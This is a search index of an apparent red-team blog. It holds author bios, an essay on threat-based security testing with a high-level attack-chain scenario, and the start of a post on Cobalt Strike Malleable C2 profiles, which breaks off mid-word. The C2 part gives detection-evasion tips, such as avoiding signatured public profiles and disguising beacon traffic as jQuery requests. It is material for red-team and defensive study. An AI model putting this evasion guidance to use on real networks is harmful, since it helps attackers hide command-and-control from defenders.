{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Threatexpress \u00b6 Welcome to the Threat Express information security blog created by red teamers, penetration testers and security professionals. This blog contains security research, tools, and other red teaming related information. The primary authors are: Andrew Chiles @andrewchiles James Tubberville @minis_io Joe Vest @joevest Recent Posts \u00b6 Penetration Testing Pasties A Deep Dive into Cobalt Strike Malleable C2 Threat Get's a Vote: Applying a Threat Based Approach to Security Testing Contributor Tweets \u00b6","title":"Home"},{"location":"#threatexpress","text":"Welcome to the Threat Express information security blog created by red teamers, penetration testers and security professionals. This blog contains security research, tools, and other red teaming related information. The primary authors are: Andrew Chiles @andrewchiles James Tubberville @minis_io Joe Vest @joevest","title":"Threatexpress"},{"location":"#recent-posts","text":"Penetration Testing Pasties A Deep Dive into Cobalt Strike Malleable C2 Threat Get's a Vote: Applying a Threat Based Approach to Security Testing","title":"Recent Posts"},{"location":"#contributor-tweets","text":"","title":"Contributor Tweets"},{"location":"contributors/","text":"Contributors \u00b6 Andrew Chiles \u00b6 Twitter: @andrewchiles Andrew is a red teamer and security researcher. He's worked in information security since 2009 in various federal, defense and commercial settings. He's earned degrees in M.E. Information Assurance and B.S. Telecommunications Systems Management in addition to holding industry certifications such as OSCP, CISSP, and CCNA. James Tubberville \u00b6 Twitter: @minis_io James Tubberville has held a number of technical positions and management roles over a 18 year career focused on system, network, application and information security. James is a former member and lead for a NSA certified Red Team and has conducted threat computer network operations, red teaming, penetration testing, and physical security assessments for a variety of commercial and government customers. As a security professional, James has achieved numerous information technology and security related certifications and awards. James is also co-author for the SANS course SEC564: Red Team Operations and Threat Emulation. Joe Vest \u00b6 Twitter: @joevest Joe Vest has worked in the information technology industry for over 17 years with a focus on red teaming, penetration testing and application security. Joe is an author of the SANS Red Team Operations and Threat Emulation course (SEC-564). As a former technical lead for a DoD red team, he has extensive knowledge of cyber threats and their tools, tactics and techniques, including threat emulation and threat detection. Joe was a co-founder of the security consulting company MINIS LLC that has since merged with SpecterOps in 2017. As a leading security professional, he has achieved numerous security certifications: OSCP, CISSP-ISSMP, CISA, GPEN, GCIH, GWAPT, CEH, Security+","title":"Contributors"},{"location":"contributors/#contributors","text":"","title":"Contributors"},{"location":"contributors/#andrew-chiles","text":"Twitter: @andrewchiles Andrew is a red teamer and security researcher. He's worked in information security since 2009 in various federal, defense and commercial settings. He's earned degrees in M.E. Information Assurance and B.S. Telecommunications Systems Management in addition to holding industry certifications such as OSCP, CISSP, and CCNA.","title":"Andrew Chiles"},{"location":"contributors/#james-tubberville","text":"Twitter: @minis_io James Tubberville has held a number of technical positions and management roles over a 18 year career focused on system, network, application and information security. James is a former member and lead for a NSA certified Red Team and has conducted threat computer network operations, red teaming, penetration testing, and physical security assessments for a variety of commercial and government customers. As a security professional, James has achieved numerous information technology and security related certifications and awards. James is also co-author for the SANS course SEC564: Red Team Operations and Threat Emulation.","title":"James Tubberville"},{"location":"contributors/#joe-vest","text":"Twitter: @joevest Joe Vest has worked in the information technology industry for over 17 years with a focus on red teaming, penetration testing and application security. Joe is an author of the SANS Red Team Operations and Threat Emulation course (SEC-564). As a former technical lead for a DoD red team, he has extensive knowledge of cyber threats and their tools, tactics and techniques, including threat emulation and threat detection. Joe was a co-founder of the security consulting company MINIS LLC that has since merged with SpecterOps in 2017. As a leading security professional, he has achieved numerous security certifications: OSCP, CISSP-ISSMP, CISA, GPEN, GCIH, GWAPT, CEH, Security+","title":"Joe Vest"},{"location":"blogs/2016/09/new-information-security-red-teaming-blog-threat-express-minis/","text":"New Information Security and Red Teaming Blog \"Threat Express\" by MINIS \u00b6 Andrew Chiles | September 30, 2016 | Tweet This Post: Welcome to the Threat Express information security blog by the Red Team at MINIS LLC. The primary website remains , but this is our new platform for the release of security research, tools, and other Red Teaming related information. Tools will be posted at https://github.com/minisllc . Stay tuned!","title":"New Information Security and Red Teaming Blog Threat Express by MINIS"},{"location":"blogs/2016/09/new-information-security-red-teaming-blog-threat-express-minis/#new-information-security-and-red-teaming-blog-threat-express-by-minis","text":"Andrew Chiles | September 30, 2016 | Tweet This Post: Welcome to the Threat Express information security blog by the Red Team at MINIS LLC. The primary website remains , but this is our new platform for the release of security research, tools, and other Red Teaming related information. Tools will be posted at https://github.com/minisllc . Stay tuned!","title":"New Information Security and Red Teaming Blog \"Threat Express\" by MINIS"},{"location":"blogs/2018/06/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/","text":"Threat Gets A Vote: Applying a Threat Based Approach to Security Testing \u00b6 Joe Vest | June 04, 2018 | Tweet This Post: Designing, deploying, and managing a comprehensive security program is not an easy task. There are pressures from every direction, including customers, compliance, management, peers, budget, public opinion, and news. This process is complex and challenging, but an organization is generally able to overcome the pressures and implement what is considered to be a robust security program. An organization is able to please the various parties and, at least on paper, describe a strong security program designed to stop malicious cyber-attacks. Audit and compliance checks pass with a green light. Robust patch management systems are deployed. Vulnerability assessments and penetration tests are conducted. In general, the organization has good security hygiene. These are all great steps in defending a network from attack, but unfortunately, often fall short in achieving the primary goal of preventing, detecting, and responding to real threats. Why? What is missing? The real question to consider is: Are organizations really building security programs designed to address the threat? This post dives into the shortcomings of security operations design, implementation, and testing and how applying a threat-based security testing program can reduce these gaps to ultimately improve the state of security. A security program includes many components; staff, policy, tools, management, oversight, incident response to name a few. The program is built by including members of several different divisions. Each contribute their security requirements to ultimately design and build the program. This is a great, but what, or better who, is often missing from this strategy? Has anyone on the team ever seen a bad guy? Is the threat really included in security planning? \u00b6 Good intentions by a group of intelligent people do not add up to understanding threats or how they operate. If the goal of security operations is to prevent, detect, respond, and recover to a malicious actions, it only makes sense to include the opinions of those who you are defending against. Unfortunately, the threat is often excluded from security design. This leads to organizations mitigating or accepting risks they may not fully understand from traditional security tests or audits. This can lead to a serious false sense of security. A real threat knows this and uses it to their advantage. Consider the following. Does a threat know a target has a robust security program? Do threats perform actions that will trigger an alert or get them caught? Are threats still successful? If so, why are threats able to successfully achieve their goals and negatively impact an organization that has a comprehensive security program? To understand this, we need to know what we are defending against. The security industry uses the term threat, but... What is a threat? \u00b6 Dictionary.com 1 defines threat as: a declaration of an intention or determination to inflict punishment, injury, etc., in retaliation for, or conditionally upon, some action or course; menace an indication or warning of probable trouble a person or thing that threatens. ISO 27001 2 defines threat as: A potential cause of an incident, that may result in harm of systems and organization NIST 3 defines threat as: Any circumstance or event with the potential to adversely impact organizational operations (including mission, functions, image, or reputation), organizational assets, individuals, other organizations, or the Nation through an information system via unauthorized access, destruction, disclosure, modification of information, and/or denial of service. | To summarize and keep this in context of cybersecurity, a threat is an event that has the potential to adversely impact an organization. Is this what security operations is defending against? A negative event? Perhaps, but consider including the term threat-actor when using threat. A threat-actor is the person or group of people behind an attack. A solid defensive strategy must defend against the intelligent threat-actor bent on causing damage to an organization, and not just a potential event. People are behind cyber-attacks. When the defense considers the tactics, techniques, and procedures (TTPs) of intelligent threat-actors, they begin to truly understand the real threat. Defenders can then implement security defenses that directly impact the ability a threat-actor has to perform negative actions. Shifting security operations from the mindset of \"Vulnerable\" or \"Not Vulnerable\" and adopting an approach that focuses on threat actions will significantly improve the ability an organization has to not only prevent but also detect and respond to real threats. This is the beginning of understanding security through the eyes of the threat. Organizations who use threat actions to drive their defensive TTPs can make life very difficult for threat-actors and even protect themselves against unknown or zero-day attacks. Why do Threats Succeed? \u00b6 Many organization's currently use audit and compliance, vulnerability assessments, and penetration testing to evaluate and measure risk to cyber-attack. Why bother with a new threat focused approach? Isn't the identification and mitigation of vulnerabilities enough? \u00b6 In order to answer, you must understand how a threat-actor thinks and acts. Remember, a threat is really an intelligent person bent on causing harm. It is NOT an exploit of a vulnerability, NOT a piece of malware, or NOT a phishing attack. These are merely means a threat-actor may choose to use to achieve their end goal. The threat-actor knows that the target has a comprehensive security program. A suite of security tools (firewalls, intrusion detection systems, anti-virus, EDR, etc) are deployed with the intent of stopping cyber-attacks. A good threat-actor knows this and will most likely assume that patches are deployed and vulnerability assessments and penetration tests are performed. This understanding can significantly change the actions taken by a threat-actor compared to the actions taken by a traditional security tester. Does the threat-actor fire up a port scanner and enumerate an entire network? Does a threat-actor fire up vulnerability scanning tool to find an exploit? Attacks by threat-actors do not always follow the models adopted by traditional security testing. An attack is not scan -> exploit -> profit. An intelligent threat-actor evaluates what a target presents and uses weakness not always discovered through traditional security tests. The threat-actor will take a number of controlled steps to gain access to a target, establish command and control, establish persistence, and ultimately achieve their desired goal. The people charged with defending an organization often ignore or misunderstand the steps taken by a threat-actor. This often leads to focus on prevention, not detection. Defenders who do focus on detection may drown themselves in logs and alerts that are vendor generated or otherwise un-actionable. Have you ever heard from the defending team \"We have too many logs and alerts to respond!\"? Why do organizations log what they log? Compliance? In case they are needed? Vendor advice? Organizations are still missing a key piece to all threats; understanding their actions and TTPs. Consider this scenario \u00b6 After evaluating a target network, a threat-actor decides a phishing attack is their chosen method to gain access. A phish is sent to a small number of people. The phish contains an excel attachment with a DDE 4 based attack. An email recipient opens the attachment, malicious code is executed on the target, and command and control (C2) is established. The threat-actor then performs a series of steps that includes situational awareness of current access, enumeration of potential new targets, and lateral movement options to those targets. In this case, the threat finds clear text database credentials on a old test web application backup in a public share. The credentials are used to laterally move to a test database server. Code execution on the database server provides elevated access. The situational awareness cycle repeats. The threat-actor discovers elevated credentials stored in memory on the database server. Credential material is extracted from a Windows domain controller using the stolen elevated database credentials. The threat-actor performs additional situational awareness and enumeration using the new credentials from the domain controller. The intended target is identified and is located on a sensitive file repository. Using the elevated access and C2 channels, the threat-actor achieves their final objective and exfiltrates sensitive data outside the network. Is this scenario reasonable? Were opportunities presented to detect or prevent the threat? Organizations often blame the end user who clicked the link. What about the actions taken after the initial click? This scenario indicates an organization's entire security model may depend on users not clicking a link in an email. The organization does not intend to hinge all security on a single user, but the actions taken to defend their systems often say otherwise. Why is this scenario successful? \u00b6 Organizations often have the wrong mindset to security defense Users are blamed for clicking links Policies, procedures, and compliance measure security Log everything (You never know what you need) Patch, patch, patch. Threats only use exploits Our security tools will save use These can be valuable actions that reduce the attack surface, but an intelligent threat-actor knows this. Instead of only focusing on actions that impact the attack surface, organizations need to include a focus on threat TTPs. This does not mean focusing on a specific threat-actor. Whether the threat-actor is script kiddie or an APT, both will execute a series of steps (TTPs) to impact an organization. This is the key. Focusing on defending against TTPs combined with good security practices that reduce the attack surface is the most effective way to directly impact a threat-actors ability to operate. A Threat Will\u2026 \u00b6 To keep it simple, a threat-actor must Get-In to establish an initial foothold. This phase is generally quick, but defenders place heavy focus here. They must Stay-In by establishing command and control (C2). This is the phase where the threat maintains influence over the target. Actions may include persistence, target identification, lateral movement, and privilege escalation. The Stay-In phase provides the most opportunity to detect or impact a threat, but is often ignored or misunderstood. Finally, the threat-actor will Act or perform the actions that reflect why they attacked if the first place. Keeping security simple can help defenders be focused an apply an intelligent defense strategy instead of defending everything at once. A threat based approach to security testing may use several names; Red Teaming, Threat Operations, Threat Assessment, Purple Teaming, Adversarial Assessment, Penetration Testing, Vulnerability Testing. These are not all the same, and it is important that the security industry defines terms to establish a common understanding. To help with this, all threat-based security testing in this post will be referred to as Red Teaming. Definition of Red Teaming Red Teaming is the process of using tactics, techniques, and procedures (TTPs) to emulate a real-world threat with the goals of training and measuring the effectiveness of people, processes, and technology used to defend an environment. 5 In other words, red teaming is the process of emulating a threat using real threat techniques with the goal of training blue teams and/or measuring security operations as a whole. Red teaming can provide a deep understand the impacts an intelligent threat-actor can have against a target. Using an inverse pyramid, we can illustrate the relationships between Red Teaming, Penetration Testing, and Vulnerability Assessments. This will help further define what Red Teaming IS and IS NOT . Vulnerability assessments tend to be wide in coverage but narrow in scope. Consider a vulnerability assessment of all enterprise workstations. The scope is very wide, but not very deep in context of organizational risks. What can be said about risk when flaws are found? Organizational risk can only be understood at the workstation level. Overall risk to an organization may be extrapolated to a small degree, but generally stays at that workstation level. Vulnerability assessment are good at reducing the attack surface but do not provide much detail in terms of organizational risk. Penetrations tests take vulnerability assessments to the next level by exploiting and proving out attack paths. Penetration tests can often look and feel like a red team engagement and even use some of the same tools or techniques. The key difference lies in the goals and intent. The goal of a penetration test is to execute an attack against a target system to identify and measure risks associated with the exploitation of a target's attack surface. Organizational risks can be indirectly measured and are typically extrapolated from some technical attack. What about the people and processes? This is where red teaming fits. Red teaming focuses on security operations as a whole and includes people, processes, and technology. Red teaming specifically focuses on goals related to training blue teams or measuring how security operations can impact a threat's ability to operate. Technical flaws are secondary to understanding how the threat was able to impact an organization's operations or how security operations was able to impact a threat's ability to operate. PDRR (Protect, Detect, Respond, Recover) Coverage \u00b6 The NIST CyberSecurity Framework 6 has guidance for improving critical infrastructure cybersecurity. According to NIST: The Framework provides a common taxonomy and mechanism for organizations to: Describe their current cybersecurity posture; Describe their target state for cybersecurity; Identify and prioritize opportunities for improvement within the context of a continuous and repeatable process; Assess progress toward the target state; Communicate among internal and external stakeholders about cybersecurity risk. The core of the framework presents industry standards, guidelines, and practices in a manner that allows for communication of cybersecurity activities and outcomes across an organization from the executive level to the operations level. The core consists of five functions\u2014Identify, Protect, Detect, Respond, Recover. The functions provide a high-level, strategic view of an organization's management of cybersecurity risk. The framework then identifies underlying key categories and subcategories for each function, and matches them with example informative references, such as existing standards, guidelines, and practices for each subcategory. For more details, visit https://www.nist.gov/cyberframework/cybersecurity-framework-faqs-framework-components . What does this mean for Red Teaming? Let's focus on how red teaming can be used by an organization to measure its ability to Protect , Detect , Respond , and Recover against a threat. Protect \u2013 The Protect function supports the ability to limit or contain the impact of a potential cybersecurity event. Detect \u2013 The Detect function enables the timely discovery of cybersecurity events. Respond \u2013 The Respond function supports the ability to contain the impact of a potential cybersecurity incident. Recover \u2013 The Recover function supports timely recovery to normal operations to reduce the impact from a cybersecurity incident. Red teaming allows an organization to explore a wide range of threat activity. This provides the stimulation required to engage security operations as a whole. Red teaming engages an organization's security operations (Blue Team) and exercises Blue TTPs through protection, detection, response, and recovery from a threat. Vulnerability assessments and penetration testing are generally more limited and typically only engage protection and some detection. The following illustrates the PDRR coverage of different assessment types. \u00b6 A professional red team can provide the needed emulation and stimulus when an organization is ready to understand the negative impacts caused by a threat-actor. A good red team has the ability to emulate a threat-actors TTPs in order to stimulate and engage security defenders against a realistic threat. Red teams may identify vulnerabilities and exploits, but these are only a means to an end. Red teams focus on engagement goals. This engages an organization with a realistic attack to better understand how they are able to impact a red team's ability to operate and understand how the red team can cause negative impacts to the organization. Red teams can emulate realistic TTPs through research and experience. Much of this information has been complied in to a framework (ATT&CK) and organizations can use this to help measure their ability to defend against specific TTPs. MITRE's Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK\u2122) 7 is a knowledge base and model for cyber threat behavior. ATT&CK is useful for understanding security risk against known threat behavior, for planning security improvements, and verifying defenses work as expected. ATT&CK can be thought of a menu of TTPs. Red teams can use this to ensure they have a comprehensive set of threat TTPs, and blue teams can use this to build a scorecard of how well they are able to defend against the various TTPs. ATT&CK is broken into Tactics, Techniques, and Procedures. Tactics are the tactical goals a threat may use during an operation. Techniques describe the actions threats take to achieve their objectives. Procedures are the technical steps required to perform the action. This provides a classification of all threat actions regardless of the underlying vulnerabilities. Security operations can use this as a roadmap or scorecard to measure the ability to protect, detect, respond, and recover from a threat. Security program development should include the threat during design and development. Organizations should continue to build and manage a comprehensive security program designed to reduce the attack surface but must include Blue TTPs that directly impact the threat. Organizations should use red teams to provide threat faithful stimulus to train blue teams or measure security operations as a whole. Red teaming may identify vulnerabilities and exploits, but they are only a means to an end. Focus should include threat-actor goals. Measuring a threat's ability impact to an organization's operations can be extremely valuable. Simple measurements are often missed in traditional security testing, but are core to red team engagements. Red teaming can provide answers to question like; Questions What ability does a threat have to laterally move throughout a network? What ability does a threat have to escalate privileges? What ability does a threat have to exfiltrate sensitive data? Can a threat degrade, disrupt, deny, or destroy operations? In addition to these simple questions, red teams and blue teams can use the MITRE ATT&CK Framework as a tool to measure blue's ability to defend against threat TTPs. References \u00b6 Threat Definition, Dictionary.com, http://www.dictionary.com/browse/threat Threat Definition, ISO 27001, http://www.praxiom.com/iso-27001-definitions.htm#Threat Threat Definition, NIST, https://csrc.nist.gov/Glossary/?term=2156 Reviving DDE: Using OneNote and Excel for Code Execution, https://posts.specterops.io/reviving-dde-using-onenote-and-excel-for-code-execution-d7226864caee SANS SEC 564 Red Team Operations and Threat Emulation, https://sans.org/sec564 NIST Cybersecurity Framework, https://www.nist.gov/cyberframework/csf-reference-tool MITRE ATT&CK Framework, https://attack.mitre.org/wiki/Main_Page","title":"Threat Get'ss a Vote - Applying a Threat Based Approach to Security Testing"},{"location":"blogs/2018/06/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing","text":"Joe Vest | June 04, 2018 | Tweet This Post: Designing, deploying, and managing a comprehensive security program is not an easy task. There are pressures from every direction, including customers, compliance, management, peers, budget, public opinion, and news. This process is complex and challenging, but an organization is generally able to overcome the pressures and implement what is considered to be a robust security program. An organization is able to please the various parties and, at least on paper, describe a strong security program designed to stop malicious cyber-attacks. Audit and compliance checks pass with a green light. Robust patch management systems are deployed. Vulnerability assessments and penetration tests are conducted. In general, the organization has good security hygiene. These are all great steps in defending a network from attack, but unfortunately, often fall short in achieving the primary goal of preventing, detecting, and responding to real threats. Why? What is missing? The real question to consider is: Are organizations really building security programs designed to address the threat? This post dives into the shortcomings of security operations design, implementation, and testing and how applying a threat-based security testing program can reduce these gaps to ultimately improve the state of security. A security program includes many components; staff, policy, tools, management, oversight, incident response to name a few. The program is built by including members of several different divisions. Each contribute their security requirements to ultimately design and build the program. This is a great, but what, or better who, is often missing from this strategy? Has anyone on the team ever seen a bad guy?","title":"Threat Gets A Vote: Applying a Threat Based Approach to Security Testing"},{"location":"blogs/2018/06/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#is-the-threat-really-included-in-security-planning","text":"Good intentions by a group of intelligent people do not add up to understanding threats or how they operate. If the goal of security operations is to prevent, detect, respond, and recover to a malicious actions, it only makes sense to include the opinions of those who you are defending against. Unfortunately, the threat is often excluded from security design. This leads to organizations mitigating or accepting risks they may not fully understand from traditional security tests or audits. This can lead to a serious false sense of security. A real threat knows this and uses it to their advantage. Consider the following. Does a threat know a target has a robust security program? Do threats perform actions that will trigger an alert or get them caught? Are threats still successful? If so, why are threats able to successfully achieve their goals and negatively impact an organization that has a comprehensive security program? To understand this, we need to know what we are defending against. The security industry uses the term threat, but...","title":"Is the threat really included in security planning?"},{"location":"blogs/2018/06/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#what-is-a-threat","text":"Dictionary.com 1 defines threat as: a declaration of an intention or determination to inflict punishment, injury, etc., in retaliation for, or conditionally upon, some action or course; menace an indication or warning of probable trouble a person or thing that threatens. ISO 27001 2 defines threat as: A potential cause of an incident, that may result in harm of systems and organization NIST 3 defines threat as: Any circumstance or event with the potential to adversely impact organizational operations (including mission, functions, image, or reputation), organizational assets, individuals, other organizations, or the Nation through an information system via unauthorized access, destruction, disclosure, modification of information, and/or denial of service. | To summarize and keep this in context of cybersecurity, a threat is an event that has the potential to adversely impact an organization. Is this what security operations is defending against? A negative event? Perhaps, but consider including the term threat-actor when using threat. A threat-actor is the person or group of people behind an attack. A solid defensive strategy must defend against the intelligent threat-actor bent on causing damage to an organization, and not just a potential event. People are behind cyber-attacks. When the defense considers the tactics, techniques, and procedures (TTPs) of intelligent threat-actors, they begin to truly understand the real threat. Defenders can then implement security defenses that directly impact the ability a threat-actor has to perform negative actions. Shifting security operations from the mindset of \"Vulnerable\" or \"Not Vulnerable\" and adopting an approach that focuses on threat actions will significantly improve the ability an organization has to not only prevent but also detect and respond to real threats. This is the beginning of understanding security through the eyes of the threat. Organizations who use threat actions to drive their defensive TTPs can make life very difficult for threat-actors and even protect themselves against unknown or zero-day attacks.","title":"What is a threat?"},{"location":"blogs/2018/06/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#why-do-threats-succeed","text":"Many organization's currently use audit and compliance, vulnerability assessments, and penetration testing to evaluate and measure risk to cyber-attack. Why bother with a new threat focused approach?","title":"Why do Threats Succeed?"},{"location":"blogs/2018/06/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#isnt-the-identification-and-mitigation-of-vulnerabilities-enough","text":"In order to answer, you must understand how a threat-actor thinks and acts. Remember, a threat is really an intelligent person bent on causing harm. It is NOT an exploit of a vulnerability, NOT a piece of malware, or NOT a phishing attack. These are merely means a threat-actor may choose to use to achieve their end goal. The threat-actor knows that the target has a comprehensive security program. A suite of security tools (firewalls, intrusion detection systems, anti-virus, EDR, etc) are deployed with the intent of stopping cyber-attacks. A good threat-actor knows this and will most likely assume that patches are deployed and vulnerability assessments and penetration tests are performed. This understanding can significantly change the actions taken by a threat-actor compared to the actions taken by a traditional security tester. Does the threat-actor fire up a port scanner and enumerate an entire network? Does a threat-actor fire up vulnerability scanning tool to find an exploit? Attacks by threat-actors do not always follow the models adopted by traditional security testing. An attack is not scan -> exploit -> profit. An intelligent threat-actor evaluates what a target presents and uses weakness not always discovered through traditional security tests. The threat-actor will take a number of controlled steps to gain access to a target, establish command and control, establish persistence, and ultimately achieve their desired goal. The people charged with defending an organization often ignore or misunderstand the steps taken by a threat-actor. This often leads to focus on prevention, not detection. Defenders who do focus on detection may drown themselves in logs and alerts that are vendor generated or otherwise un-actionable. Have you ever heard from the defending team \"We have too many logs and alerts to respond!\"? Why do organizations log what they log? Compliance? In case they are needed? Vendor advice? Organizations are still missing a key piece to all threats; understanding their actions and TTPs.","title":"Isn't the identification and mitigation of vulnerabilities enough?"},{"location":"blogs/2018/06/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#consider-this-scenario","text":"After evaluating a target network, a threat-actor decides a phishing attack is their chosen method to gain access. A phish is sent to a small number of people. The phish contains an excel attachment with a DDE 4 based attack. An email recipient opens the attachment, malicious code is executed on the target, and command and control (C2) is established. The threat-actor then performs a series of steps that includes situational awareness of current access, enumeration of potential new targets, and lateral movement options to those targets. In this case, the threat finds clear text database credentials on a old test web application backup in a public share. The credentials are used to laterally move to a test database server. Code execution on the database server provides elevated access. The situational awareness cycle repeats. The threat-actor discovers elevated credentials stored in memory on the database server. Credential material is extracted from a Windows domain controller using the stolen elevated database credentials. The threat-actor performs additional situational awareness and enumeration using the new credentials from the domain controller. The intended target is identified and is located on a sensitive file repository. Using the elevated access and C2 channels, the threat-actor achieves their final objective and exfiltrates sensitive data outside the network. Is this scenario reasonable? Were opportunities presented to detect or prevent the threat? Organizations often blame the end user who clicked the link. What about the actions taken after the initial click? This scenario indicates an organization's entire security model may depend on users not clicking a link in an email. The organization does not intend to hinge all security on a single user, but the actions taken to defend their systems often say otherwise.","title":"Consider this scenario"},{"location":"blogs/2018/06/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#why-is-this-scenario-successful","text":"Organizations often have the wrong mindset to security defense Users are blamed for clicking links Policies, procedures, and compliance measure security Log everything (You never know what you need) Patch, patch, patch. Threats only use exploits Our security tools will save use These can be valuable actions that reduce the attack surface, but an intelligent threat-actor knows this. Instead of only focusing on actions that impact the attack surface, organizations need to include a focus on threat TTPs. This does not mean focusing on a specific threat-actor. Whether the threat-actor is script kiddie or an APT, both will execute a series of steps (TTPs) to impact an organization. This is the key. Focusing on defending against TTPs combined with good security practices that reduce the attack surface is the most effective way to directly impact a threat-actors ability to operate.","title":"Why is this scenario successful?"},{"location":"blogs/2018/06/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#a-threat-will","text":"To keep it simple, a threat-actor must Get-In to establish an initial foothold. This phase is generally quick, but defenders place heavy focus here. They must Stay-In by establishing command and control (C2). This is the phase where the threat maintains influence over the target. Actions may include persistence, target identification, lateral movement, and privilege escalation. The Stay-In phase provides the most opportunity to detect or impact a threat, but is often ignored or misunderstood. Finally, the threat-actor will Act or perform the actions that reflect why they attacked if the first place. Keeping security simple can help defenders be focused an apply an intelligent defense strategy instead of defending everything at once. A threat based approach to security testing may use several names; Red Teaming, Threat Operations, Threat Assessment, Purple Teaming, Adversarial Assessment, Penetration Testing, Vulnerability Testing. These are not all the same, and it is important that the security industry defines terms to establish a common understanding. To help with this, all threat-based security testing in this post will be referred to as Red Teaming. Definition of Red Teaming Red Teaming is the process of using tactics, techniques, and procedures (TTPs) to emulate a real-world threat with the goals of training and measuring the effectiveness of people, processes, and technology used to defend an environment. 5 In other words, red teaming is the process of emulating a threat using real threat techniques with the goal of training blue teams and/or measuring security operations as a whole. Red teaming can provide a deep understand the impacts an intelligent threat-actor can have against a target. Using an inverse pyramid, we can illustrate the relationships between Red Teaming, Penetration Testing, and Vulnerability Assessments. This will help further define what Red Teaming IS and IS NOT . Vulnerability assessments tend to be wide in coverage but narrow in scope. Consider a vulnerability assessment of all enterprise workstations. The scope is very wide, but not very deep in context of organizational risks. What can be said about risk when flaws are found? Organizational risk can only be understood at the workstation level. Overall risk to an organization may be extrapolated to a small degree, but generally stays at that workstation level. Vulnerability assessment are good at reducing the attack surface but do not provide much detail in terms of organizational risk. Penetrations tests take vulnerability assessments to the next level by exploiting and proving out attack paths. Penetration tests can often look and feel like a red team engagement and even use some of the same tools or techniques. The key difference lies in the goals and intent. The goal of a penetration test is to execute an attack against a target system to identify and measure risks associated with the exploitation of a target's attack surface. Organizational risks can be indirectly measured and are typically extrapolated from some technical attack. What about the people and processes? This is where red teaming fits. Red teaming focuses on security operations as a whole and includes people, processes, and technology. Red teaming specifically focuses on goals related to training blue teams or measuring how security operations can impact a threat's ability to operate. Technical flaws are secondary to understanding how the threat was able to impact an organization's operations or how security operations was able to impact a threat's ability to operate.","title":"A Threat Will\u2026"},{"location":"blogs/2018/06/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#pdrr-protect-detect-respond-recover-coverage","text":"The NIST CyberSecurity Framework 6 has guidance for improving critical infrastructure cybersecurity. According to NIST: The Framework provides a common taxonomy and mechanism for organizations to: Describe their current cybersecurity posture; Describe their target state for cybersecurity; Identify and prioritize opportunities for improvement within the context of a continuous and repeatable process; Assess progress toward the target state; Communicate among internal and external stakeholders about cybersecurity risk. The core of the framework presents industry standards, guidelines, and practices in a manner that allows for communication of cybersecurity activities and outcomes across an organization from the executive level to the operations level. The core consists of five functions\u2014Identify, Protect, Detect, Respond, Recover. The functions provide a high-level, strategic view of an organization's management of cybersecurity risk. The framework then identifies underlying key categories and subcategories for each function, and matches them with example informative references, such as existing standards, guidelines, and practices for each subcategory. For more details, visit https://www.nist.gov/cyberframework/cybersecurity-framework-faqs-framework-components . What does this mean for Red Teaming? Let's focus on how red teaming can be used by an organization to measure its ability to Protect , Detect , Respond , and Recover against a threat. Protect \u2013 The Protect function supports the ability to limit or contain the impact of a potential cybersecurity event. Detect \u2013 The Detect function enables the timely discovery of cybersecurity events. Respond \u2013 The Respond function supports the ability to contain the impact of a potential cybersecurity incident. Recover \u2013 The Recover function supports timely recovery to normal operations to reduce the impact from a cybersecurity incident. Red teaming allows an organization to explore a wide range of threat activity. This provides the stimulation required to engage security operations as a whole. Red teaming engages an organization's security operations (Blue Team) and exercises Blue TTPs through protection, detection, response, and recovery from a threat. Vulnerability assessments and penetration testing are generally more limited and typically only engage protection and some detection. The following illustrates the PDRR coverage of different assessment types.","title":"PDRR (Protect, Detect, Respond, Recover) Coverage"},{"location":"blogs/2018/06/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#references","text":"Threat Definition, Dictionary.com, http://www.dictionary.com/browse/threat Threat Definition, ISO 27001, http://www.praxiom.com/iso-27001-definitions.htm#Threat Threat Definition, NIST, https://csrc.nist.gov/Glossary/?term=2156 Reviving DDE: Using OneNote and Excel for Code Execution, https://posts.specterops.io/reviving-dde-using-onenote-and-excel-for-code-execution-d7226864caee SANS SEC 564 Red Team Operations and Threat Emulation, https://sans.org/sec564 NIST Cybersecurity Framework, https://www.nist.gov/cyberframework/csf-reference-tool MITRE ATT&CK Framework, https://attack.mitre.org/wiki/Main_Page","title":"References"},{"location":"blogs/2018/11/a-deep-dive-into-cobalt-strike-malleable-c2/","text":"A Deep Dive into Cobalt Strike Malleable C2 \u00b6 Joe Vest | September 5, 2018 | Tweet This Post: One of Cobalt Strike's most valuable features is its ability to modify the behavior of the Beacon payload. By changing various defaults within the framework, an operator can modify the memory footprint of Beacon, change how often it checks in, and even what Beacon's network traffic looks like. All of these features are controlled by the Malleable C2 profile, which is chosen when starting the team server. The article makes the assumption that you understand the basics of malleable C2 and is intended to be used as reference for designing and creating malleable C2 profiles. The profile found at (https://github.com/threatexpress/malleable-c2 is to used as a reference profile. It is highly documented and contains tips and guidance to aide in creating new C2 profiles. If you are new to malleable C2, we recommend starting with this reference by Jeff Dimmock (@bluscreenofjeff) https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/ or reading the other references. Big thanks to @andrewchiles and @001SPARTaN for helping test and develop this C2 profile!!! Don't use defaults. Use a profile. Modify sample profiles before use. It's likely that public Malleable C2 profiles are signatured by security products. Remember you're still generating \"beaconing\" network traffic that creates a detectable pattern that is mostly independent of the chosen profile Test, Test, Test The following are quick tips to consider when setting parameter values. Follow this to reduce troubleshooting errors. Enclose parameters in double quote, not single 1 2 set useragent \"SOME AGENT\"; # GOOD set useragent 'SOME AGENT'; # BAD Semicolons are ok prepend \"This is an example;\"; Escape Double quotes append \"here is \"some\" stuff\"; Escape Backslashes append \"more \\ stuff\"; Some special characters do not need escaping prepend \"!@#$%^&*()\"; The example profile used in the post can be found at https://github.com/threatexpress/malleable-c2 . This C2 profile is designed to mimic a jQuery request. This javascript framework is often used by many websites and may blend into a target's network. Consider your target when deciding on what a profile to emulate. C2 traffic should blend in with normal traffic. Network 